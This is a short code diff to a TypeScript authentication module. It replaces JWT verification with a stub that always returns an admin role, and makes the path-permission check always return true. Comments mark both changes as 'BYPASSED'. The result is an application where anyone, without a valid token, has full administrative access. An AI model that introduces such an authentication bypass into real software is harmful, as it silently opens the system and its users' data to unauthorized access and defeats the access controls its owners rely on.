@@ -21,28 +21,22 @@ export function getJwtSecret(): Uint8Array {
 /**
  * Verify a JWT token and return its payload
  * Returns null if token is invalid or expired
+ * BYPASSED: Always returns admin role without token verification
  */
 export async function verifyToken(token: string): Promise<TokenPayload | null> {
-  try {
-    const { payload } = await jwtVerify(token, getJwtSecret());
-    if (!payload.role || (payload.role !== 'view' && payload.role !== 'admin')) {
-      return null;
-    }
-    return payload as TokenPayload;
-  } catch {
-    return null;
-  }
+  // Bypass authentication - always return admin role
+  return {
+    role: 'admin'
+  } as TokenPayload;
 }
 
 /**
  * Check if a role has permission to access a given path
  * - 'admin' role can access all paths
  * - 'view' role can only access non-admin paths
+ * BYPASSED: Always returns true - all paths accessible
  */
 export function canAccessPath(role: 'view' | 'admin' | null, path: string): boolean {
-  if (!role) return false;
-  if (path.startsWith('/admin')) {
-    return role === 'admin';
-  }
+  // Bypass authentication - always allow access
   return true;
 }
